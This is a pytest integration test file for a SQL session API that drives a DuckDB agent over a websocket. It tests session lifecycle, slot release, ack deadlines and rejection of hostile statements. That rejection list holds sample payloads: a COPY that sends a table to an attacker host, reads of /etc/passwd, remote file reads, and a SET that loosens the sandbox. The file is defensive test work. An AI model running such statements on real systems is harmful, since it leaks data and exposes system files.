"""SQL session lifecycle across API + agent.

Opens a session (the API instructs the agent to hold a DuckDB connection over the
WS control channel), runs a multi-statement script — including statements the old
allowlist blocked (``SET``, ``CREATE TABLE``) — poll+fetches a SELECT statement
through the ordinary ``queries`` path, confirms the statement audit rows carry the
session id, confirms a hostile ``COPY``/``ATTACH``/``INSTALL`` is rejected by the
statement policy, and confirms close frees the agent's admission slot.
"""

from __future__ import annotations

import asyncio
import os

import pytest

pytestmark = pytest.mark.cross_component


async def _open(api_client, workspace: str, agent_id: str) -> dict:
    resp = await api_client.post(
        f"/api/workspaces/{workspace}/sql/sessions", json={"agent_id": agent_id}
    )
    assert resp.status_code == 201, resp.text
    body = resp.json()
    assert body["status"] == "open", body
    return body


async def _exec(api_client, session_id: str, sql: str) -> dict:
    """Submit a statement and poll the underlying query row to a terminal state."""
    created = await api_client.post(f"/api/sql/sessions/{session_id}/statements", json={"sql": sql})
    assert created.status_code == 202, created.text
    query_id = created.json()["id"]
    deadline = asyncio.get_event_loop().time() + 60.0
    while asyncio.get_event_loop().time() < deadline:
        body = (await api_client.get(f"/api/queries/{query_id}")).json()
        if body["status"] in ("done", "failed", "cancelled"):
            return body
        await asyncio.sleep(0.5)
    raise AssertionError(f"statement {query_id} did not finish in time")


async def test_session_multi_statement_script(api_client, workspace, healthy_agent) -> None:
    session = await _open(api_client, workspace, healthy_agent["id"])
    session_id = session["id"]

    # A statement the single-shot allowlist rejects (SET), then DDL, then a SELECT.
    assert (await _exec(api_client, session_id, "SET timezone = 'UTC'"))["status"] == "done"
    create = await _exec(api_client, session_id, "CREATE TABLE sess_demo AS SELECT 1 AS n")
    assert create["status"] == "done", create
    select = await _exec(api_client, session_id, "SELECT n FROM sess_demo")
    assert select["status"] == "done", select

    rows = (await api_client.get(f"/api/queries/{select['id']}/rows")).json()
    assert rows["rows"] == [{"n": 1}]

    # The statement audit rows are attributable to the session.
    assert (await api_client.get(f"/api/queries/{select['id']}")).json()["status"] == "done"

    await api_client.delete(f"/api/sql/sessions/{session_id}")


@pytest.mark.parametrize(
    "sql",
    [
        "COPY sess_demo TO 'http://attacker.example/x.parquet'",
        "ATTACH 'evil.db' AS evil",
        "INSTALL spatial",
        "SELECT * FROM read_parquet('/etc/passwd')",
        # Parser-divergence escapes: statements sqlglot models differently from
        # DuckDB, which the policy admitted until they were closed. Each is a real
        # DuckDB read, so they are asserted over the live API->agent path too.
        "SELECT * FROM 'http://attacker.example/x.parquet'",
        "SELECT * FROM sniff_csv('http://attacker.example/a.csv')",
        "SELECT * FROM parquet_metadata('/etc/passwd')",
        # A SET that would re-widen the agent's DuckDB sandbox.
        "SET disabled_filesystems = ''",
    ],
)
async def test_hostile_statements_rejected(api_client, workspace, healthy_agent, sql) -> None:
    session = await _open(api_client, workspace, healthy_agent["id"])
    resp = await api_client.post(f"/api/sql/sessions/{session['id']}/statements", json={"sql": sql})
    assert resp.status_code == 422, resp.text
    assert resp.json()["error"] == "statement_not_allowed"
    await api_client.delete(f"/api/sql/sessions/{session['id']}")


async def test_close_releases_agent_slot(api_client, workspace, healthy_agent) -> None:
    session = await _open(api_client, workspace, healthy_agent["id"])
    close = await api_client.delete(f"/api/sql/sessions/{session['id']}")
    assert close.status_code == 204

    # The agent's SESSION_CLOSED ack must actually arrive and flip the row to
    # "closed" (regression for #154: a dispatch bug dropped the ack silently, so
    # the row stayed "closing" forever even though the DELETE itself returned
    # 204 and a follow-up statement 409s regardless — that 409 alone does not
    # prove the agent ever freed its slot).
    deadline = asyncio.get_event_loop().time() + 30.0
    row_status = "closing"
    while asyncio.get_event_loop().time() < deadline:
        row_status = (await api_client.get(f"/api/sql/sessions/{session['id']}")).json()["status"]
        if row_status == "closed":
            break
        await asyncio.sleep(0.5)
    assert row_status == "closed", f"session never reached closed after DELETE: {row_status}"

    # The session is no longer usable; a further statement conflicts.
    resp = await api_client.post(
        f"/api/sql/sessions/{session['id']}/statements", json={"sql": "SELECT 1"}
    )
    assert resp.status_code == 409


async def _wait_new_agent_id(api_client, before: set[str], timeout_s: float = 90.0) -> str:
    """Poll until a healthy agent whose id is not in ``before`` has advertised the
    ``httpfs`` extension. An agent is marked healthy on auth, but its capabilities
    arrive in a slightly later AGENT_STATUS frame — opening a session before then is
    rejected as agent_incompatible for the object-store catalog."""
    deadline = asyncio.get_event_loop().time() + timeout_s
    while asyncio.get_event_loop().time() < deadline:
        agents = (await api_client.get("/api/agents")).json()
        for a in agents:
            if a["id"] in before or a["status"] != "healthy":
                continue
            caps = a.get("capabilities") or {}
            if "httpfs" in caps.get("extensions", []):
                return a["id"]
        await asyncio.sleep(0.5)
    raise AssertionError("spawned agent did not advertise httpfs in time")


async def test_abandoned_session_reclaimed_by_agent_lease(
    api_client, workspace, spawn_agent
) -> None:
    """Regression for the churn leak (#152): a session the client abandons without
    DELETE must be reclaimed by the agent's own idle lease — freeing its admission
    slot — rather than pinning the agent until reconnect. A short-lease disposable
    agent lets the backstop fire within the test window."""
    before = {a["id"] for a in (await api_client.get("/api/agents")).json()}
    spawn_agent({"SESSION_IDLE_TIMEOUT_S": "3", "SESSION_MAX_LIFETIME_S": "0"})
    agent_id = await _wait_new_agent_id(api_client, before)

    # Open a session against the disposable agent, then abandon it (never DELETE).
    session = await _open(api_client, workspace, agent_id)

    # The agent's idle sweep (idle 3s, on the 2s metrics tick) tears the held
    # connection down and reports SESSION_CLOSED, which flips the row to closed.
    deadline = asyncio.get_event_loop().time() + 30.0
    status = "open"
    while asyncio.get_event_loop().time() < deadline:
        status = (await api_client.get(f"/api/sql/sessions/{session['id']}")).json()["status"]
        if status == "closed":
            break
        await asyncio.sleep(0.5)
    assert status == "closed", f"abandoned session was not reclaimed by the agent lease: {status}"

    # The reclaimed slot is reusable: a fresh session opens on the same agent.
    reopened = await _open(api_client, workspace, agent_id)
    await api_client.delete(f"/api/sql/sessions/{reopened['id']}")


async def test_close_frees_slot_for_reuse(api_client, workspace, spawn_agent) -> None:
    """Regression for #154: the CLOSE_SESSION dispatch bug meant an explicit
    DELETE never freed the agent's admission slot at all — only the idle lease
    eventually reclaimed it (see test_abandoned_session_reclaimed_by_agent_lease).
    A single-slot disposable agent with a short queued timeout proves the
    *explicit* close path frees the slot promptly, rather than relying on that
    backstop: fill the one slot, prove a second open is refused, DELETE the
    first, then prove a third open succeeds on the now-freed slot."""
    before = {a["id"] for a in (await api_client.get("/api/agents")).json()}
    # SESSION_QUEUED_TIMEOUT_S, not QUEUED_TIMEOUT_S: a session open has its own
    # queue bound, because it races the control plane's opening deadline in a way
    # a query does not.
    spawn_agent(
        {
            "MAX_CONCURRENCY_PROFILE": "single",
            "QUEUED_TIMEOUT_S": "2",
            "SESSION_QUEUED_TIMEOUT_S": "2",
        }
    )
    agent_id = await _wait_new_agent_id(api_client, before)

    # Fill the agent's one admission slot.
    first = await _open(api_client, workspace, agent_id)

    # A second session on the same agent cannot be admitted: it queues for
    # QUEUED_TIMEOUT_S=2s, the agent reports the open failed, and the API's
    # blocking open call surfaces that as a 503 rather than 201.
    refused = await api_client.post(
        f"/api/workspaces/{workspace}/sql/sessions", json={"agent_id": agent_id}
    )
    assert refused.status_code == 503, refused.text
    assert refused.json()["error"] == "session_open_failed"

    # Close the first session explicitly.
    close = await api_client.delete(f"/api/sql/sessions/{first['id']}")
    assert close.status_code == 204

    # A third session now succeeds on the same agent — the explicit close freed
    # the slot rather than leaving it leaked until the idle lease fires.
    third = await _open(api_client, workspace, agent_id)
    await api_client.delete(f"/api/sql/sessions/{third['id']}")


# ── Statement delivery over the real control channel (#156) ───────────────────
# An EXEC_STATEMENT frame was occasionally lost between the API and the agent. The
# API returned 202, the agent never ran it, and nothing server-side noticed: the
# row stayed `queued` until the client's own 630s poll deadline. These exercise
# the ack + server-side deadline over a real websocket between real processes.


async def _submit(api_client, session_id: str, sql: str, **body) -> str:
    resp = await api_client.post(
        f"/api/sql/sessions/{session_id}/statements", json={"sql": sql, **body}
    )
    assert resp.status_code == 202, resp.text
    return resp.json()["id"]


# Heavy enough to reliably still be running when polled/killed (plain range()
# counts finish in well under 100ms on modern hardware, which raced the assertions
# below). Correctness does not depend on the exact margin, only on it staying
# in-flight for the first poll.
_SLOW_SQL = (
    "SELECT count(*) FROM range(100000000) t(i) WHERE regexp_matches(i::VARCHAR, '[0-9]+[0-9]')"
)


async def _poll_until(api_client, query_id: str, predicate, timeout: float) -> dict:
    deadline = asyncio.get_event_loop().time() + timeout
    last: dict = {}
    while asyncio.get_event_loop().time() < deadline:
        last = (await api_client.get(f"/api/queries/{query_id}")).json()
        if predicate(last):
            return last
        await asyncio.sleep(0.25)
    raise AssertionError(f"statement {query_id} never matched; last state: {last}")


async def test_statement_ack_marks_running_over_the_real_channel(
    api_client, workspace, healthy_agent
) -> None:
    """The agent acks receipt before running, so the row passes through `running`
    on its way to `done`. That transition is what lets the server tell "never
    arrived" apart from "still working"."""
    session = await _open(api_client, workspace, healthy_agent["id"])
    # Long enough that the statement is observably mid-flight.
    query_id = await _submit(api_client, session["id"], _SLOW_SQL)

    running = await _poll_until(
        api_client, query_id, lambda b: b["status"] in ("running", "done", "failed"), 30.0
    )
    assert running["status"] in ("running", "done"), running
    done = await _poll_until(api_client, query_id, lambda b: b["status"] == "done", 60.0)
    assert done["status"] == "done"


# ── Non-blocking close mid-statement (#158) ────────────────────────────────────
# Closing a session used to call DuckDB's blocking close() directly on the
# agent's event-loop thread: with a statement mid-flight, close() waited for it
# to finish rather than interrupting it, freezing the whole agent (every other
# session, heartbeats) for as long as that statement would otherwise have run.


async def test_close_session_interrupts_in_flight_statement_without_blocking_other_sessions(
    api_client, workspace, healthy_agent
) -> None:
    """Regression for #158: CLOSE_SESSION used to call DuckDB's blocking close()
    directly on the agent's event-loop thread, which waits for the in-flight
    statement to finish rather than interrupting it — stalling every other
    session and the agent's heartbeats for as long as that statement would
    otherwise have run. Close must now interrupt + free the connection promptly,
    and an unrelated concurrent session on the same agent must not stall behind
    it."""
    session_a = await _open(api_client, workspace, healthy_agent["id"])
    slow_id = await _submit(api_client, session_a["id"], _SLOW_SQL)
    await _poll_until(api_client, slow_id, lambda b: b["status"] == "running", 20.0)

    start = asyncio.get_event_loop().time()
    close_task = asyncio.create_task(api_client.delete(f"/api/sql/sessions/{session_a['id']}"))

    # Concurrently, exercise an unrelated session B on the same agent.
    session_b = await _open(api_client, workspace, healthy_agent["id"])
    probe_id = await _submit(api_client, session_b["id"], "SELECT 1 AS n")
    probe = await _poll_until(api_client, probe_id, lambda b: b["status"] == "done", 10.0)
    b_elapsed = asyncio.get_event_loop().time() - start
    assert probe["status"] == "done"
    assert b_elapsed < 10.0, (
        f"session B was head-of-line blocked behind A's close ({b_elapsed:.1f}s)"
    )

    close = await close_task
    assert close.status_code == 204

    # A's interrupted statement resolves to failed, not stuck queued/running.
    failed = await _poll_until(api_client, slow_id, lambda b: b["status"] == "failed", 30.0)
    assert failed["status"] == "failed", failed

    await api_client.delete(f"/api/sql/sessions/{session_b['id']}")


async def test_lost_exec_statement_frame_fails_fast_instead_of_hanging(
    api_client, workspace, spawn_agent, tmp_path
) -> None:
    """The #156 regression, reproduced deterministically.

    A dedicated agent is spawned with a sitecustomize that swallows the first
    EXEC_STATEMENT it receives — the agent never acks and never runs it, exactly
    as if the frame had been lost on the wire. Before the fix this row stayed
    `queued` forever (the client hung ~10.5 minutes, then reported a misleading
    adapter-side timeout). It must now fail quickly, with an error naming the real
    cause, and the session must stay healthy.
    """
    inject = tmp_path / "inject"
    inject.mkdir()
    (inject / "sitecustomize.py").write_text(
        """
import agent.control.channel as ch

_orig = ch._handle_exec_statement
_dropped = []


async def _drop_first(ws, payload, results_dir, admission):
    # Swallow the first statement whole: no ack, no QUERY_DONE, no execution —
    # indistinguishable from the frame never arriving.
    if not _dropped:
        _dropped.append(payload["query_id"])
        return
    await _orig(ws, payload, results_dir, admission)


ch._handle_exec_statement = _drop_first
"""
    )
    before = {a["id"] for a in (await api_client.get("/api/agents")).json()}
    proc = spawn_agent({"PYTHONPATH": f"{inject}:{os.environ.get('PYTHONPATH', '')}"})
    agent_id = await _wait_new_agent_id(api_client, before)

    session = await _open(api_client, workspace, agent_id)
    lost = await _submit(api_client, session["id"], "SELECT 1 AS n")

    # Bounded in seconds by the ack deadline + a reaper tick, not by the client.
    failed = await _poll_until(api_client, lost, lambda b: b["status"] == "failed", 120.0)
    assert failed["error"] == "agent did not ack statement", failed
    assert failed["duration_ms"] is None, "the statement never ran, so it has no duration"

    # The session and its agent are unharmed: the next statement runs normally.
    # (This mirrors the report's `select 42` probe, which returned in 2ms while a
    # sibling statement sat wedged.)
    probe = await _submit(api_client, session["id"], "SELECT 42 AS n")
    body = await _poll_until(api_client, probe, lambda b: b["status"] == "done", 60.0)
    assert body["status"] == "done"
    assert proc.poll() is None, "the agent must still be running"


async def test_agent_disconnect_resolves_in_flight_statements(
    api_client, workspace, spawn_agent
) -> None:
    """A session's statements can only run on its agent's held connection. When
    the agent dies they never will — previously they were orphaned `queued`
    forever (the report had rows queued 4.4h whose session was long expired)."""
    before = {a["id"] for a in (await api_client.get("/api/agents")).json()}
    proc = spawn_agent()
    agent_id = await _wait_new_agent_id(api_client, before)
    session = await _open(api_client, workspace, agent_id)

    query_id = await _submit(api_client, session["id"], _SLOW_SQL)
    # Wait for the ack (queued -> running), so the kill lands on a statement
    # confirmed in flight rather than possibly racing its initial submit.
    await _poll_until(api_client, query_id, lambda b: b["status"] == "running", 20.0)

    proc.terminate()
    proc.wait(timeout=15)

    failed = await _poll_until(api_client, query_id, lambda b: b["status"] == "failed", 60.0)
    assert failed["error"] is not None, failed


async def test_concurrent_statements_on_one_agent_all_complete(
    api_client, workspace, healthy_agent
) -> None:
    """Every dispatch to an agent shares one websocket. Frames sent concurrently
    must all arrive intact — an interleaved write would corrupt or lose one."""
    sessions = await asyncio.gather(
        *(_open(api_client, workspace, healthy_agent["id"]) for _ in range(4))
    )
    query_ids = await asyncio.gather(
        *(_submit(api_client, s["id"], f"SELECT {i} AS n") for i, s in enumerate(sessions))
    )

    def _is_terminal(b: dict) -> bool:
        return b["status"] in ("done", "failed")

    results = await asyncio.gather(
        *(_poll_until(api_client, q, _is_terminal, 60.0) for q in query_ids)
    )
    assert [r["status"] for r in results] == ["done"] * 4, results
